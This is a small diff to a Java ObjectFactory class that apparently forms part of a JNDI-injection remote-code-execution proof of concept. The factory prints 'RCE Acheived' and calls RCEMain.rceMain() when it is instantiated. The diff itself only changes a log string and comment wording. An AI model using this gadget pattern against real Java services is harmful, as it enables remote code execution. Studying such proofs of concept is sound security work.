@@ -25,7 +25,7 @@ public class FactoryClass implements ObjectFactory {
     ) {
 
         // Add instrumentation
-        System.out.println("RCE Acheived!");
+        System.out.println("RCE Acheived in FactoryClass::getObjectInstance!");
         System.out.println("name:    " + name   );
         System.out.println("nameCtx: " + nameCtx);
         System.out.println("env:     " + env    );
@@ -34,10 +34,9 @@ public class FactoryClass implements ObjectFactory {
         // Do whatever we want
         RCEMain.rceMain();
 
-        // We could choose not to return
-        // However, the caller is expecting an object of type MadeClass. I
-        //  choose to give them something. It might be useful for further
-        //  instrumentation.
+        // We could choose not to return. However, the caller is expecting an
+        // object of type MadeClass. I choose to give them something. It's
+        // useful for further instrumentation.
         return new MadeClass();
     }
 }
